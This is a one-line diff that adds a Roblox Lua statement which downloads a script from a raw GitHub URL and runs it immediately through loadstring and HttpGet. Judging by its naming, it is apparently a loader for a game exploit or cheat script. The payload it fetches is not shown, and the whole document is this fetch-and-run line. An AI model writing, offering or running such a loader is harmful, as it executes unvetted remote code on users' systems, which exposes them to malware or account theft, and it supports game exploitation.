@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/the-eternal-abyss-spam7-scvwitlnfihw2a.lua"))()
